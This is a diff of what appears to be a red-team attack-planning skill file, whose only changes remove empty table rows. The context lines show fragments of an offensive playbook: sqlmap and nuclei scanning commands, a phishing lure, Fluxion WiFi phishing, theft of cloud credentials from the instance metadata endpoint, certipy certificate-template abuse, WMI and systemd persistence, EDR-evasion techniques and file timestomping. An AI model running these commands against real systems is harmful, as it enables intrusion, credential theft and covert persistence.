@@ -8,9 +8,6 @@ description: Use for authorized multi-stage attack-path planning and orchestrati
 ---
 
 
-|------|--------------|
-
-
 ---
 
 
@@ -111,8 +108,6 @@ wpscan --url https://target.com --enumerate p,t,u
 ---
 
 
-|---------|---------|---------|
-
 ```bash
 # SQL 注入自动化
 sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent
@@ -133,8 +128,6 @@ nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
 - [财务] 报销系统升级，请重新登录确认
 ```
 
-
-|------|------|------|
 
 ```bash
 # Fluxion WiFi 钓鱼
@@ -170,8 +163,6 @@ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
 ---
 
-
-|------|------|------|
 
 ```powershell
 # 检测 SeImpersonate
@@ -320,8 +311,6 @@ certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
 ---
 
 
-|------|:---:|:---:|
-
 ```powershell
 # WMI 事件订阅（高隐蔽）
 $Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
@@ -379,9 +368,6 @@ systemctl enable update.service
 ---
 
 
-|------|------|------|
-
-
 ```
 1. Shellcode 加载器自定义（不用公开工具）
 2. 系统调用直接调用（绕过 ntdll hook）
@@ -391,8 +377,6 @@ systemctl enable update.service
 6. 利用合法签名程序加载（LOLBins）
 ```
 
-
-|------|------|---------|
 
 ---
 
@@ -420,8 +404,6 @@ touch -t 202301010000 /path/to/file
 ---
 
 
-|---------|------|------|
-
 ---
 
 
@@ -438,6 +420,3 @@ touch -t 202301010000 /path/to/file
 `fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`
 
 ---
-
-
-|------|--------|
